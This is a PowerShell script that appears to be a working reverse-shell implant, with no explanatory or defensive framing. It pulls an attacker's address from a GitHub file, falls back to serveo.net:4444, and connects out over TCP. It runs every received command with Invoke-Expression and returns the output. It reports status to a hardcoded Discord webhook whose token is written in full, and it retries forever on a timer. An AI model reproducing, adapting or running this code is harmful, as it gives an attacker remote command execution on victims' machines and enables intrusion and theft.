# Set your Discord webhook URL here
$DiscordWebhookUrl = "https://discord.com/api/webhooks/1296452384255643659/ITVRqYmNTGa9EtgeAQBV8jEHq96aq9-RlbZa_VAGBmVALFxQqR6cYRuIuCOqNDTL-XHp"

function Send-DiscordMessage {
    param (
        [string]$message
    )

    try {
        $payload = @{
            content = $message
        } | ConvertTo-Json

        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -Body $payload -ContentType 'application/json'
    } catch {
        # If sending the message fails, just catch the error to prevent script termination
        Write-Host "Failed to send message. Error: $_"
    }
}

function Get-DynamicServeoAddress {
    $githubUrl = "https://raw.githubusercontent.com/nkt420/winstf/main/hip.txt"
    try {
        $serveoAddress = Invoke-RestMethod -Uri $githubUrl -UseBasicParsing
        Send-DiscordMessage "Retrieved Serveo Address: $serveoAddress"
        return $serveoAddress
    } catch {
        Send-DiscordMessage "Failed to retrieve Serveo address. Using fallback."
        return "serveo.net:4444"
    }
}

function Start-ReverseShell {
    param (
        [string]$serveoAddress
    )

    try {
        $addressParts = $serveoAddress -split ':'
        $ipAddress = $addressParts[0]
        $port = [int]$addressParts[1]

        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($ipAddress, $port)

        if ($client.Connected) {
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            $buffer = New-Object System.Byte[] 1024
            $hostname = [System.Net.Dns]::GetHostName()
            $writer.WriteLine("Connected from $hostname")
            Send-DiscordMessage "Connected to $serveoAddress from $hostname"

            while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
                $data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead).Trim()

                if ($data -eq "exit") {
                    break
                }

                try {
                    $output = Invoke-Expression $data 2>&1
                    if ($output) {
                        $writer.WriteLine($output)
                    }
                } catch {
                    $writer.WriteLine("Error executing command: $_")
                    Send-DiscordMessage "Error executing command: $_"
                }
            }
            $client.Close()
        } else {
            throw "Connection failed to $ipAddress:$port"
        }
    } catch {
        Send-DiscordMessage "Failed to connect to $serveoAddress. Error: $_"
    }
}

function Main {
    while ($true) {
        try {
            $serveoAddress = Get-DynamicServeoAddress
            $connected = $false
            $retryAttempts = 5

            for ($i = 1; $i -le $retryAttempts; $i++) {
                Send-DiscordMessage "Attempting connection to $serveoAddress (Attempt $i/$retryAttempts)..."
                Start-ReverseShell -serveoAddress $serveoAddress

                if ($client.Connected) {
                    $connected = $true
                    break
                } else {
                    Send-DiscordMessage "Connection failed. Retrying in 30 seconds..."
                    Start-Sleep -Seconds 30
                }
            }

            if (-not $connected) {
                Send-DiscordMessage "Unable to connect to $serveoAddress after $retryAttempts attempts."
            }

        } catch {
            Send-DiscordMessage "Error in Main loop: $_"
        }

        Start-Sleep -Seconds 3600
    }
}

Main
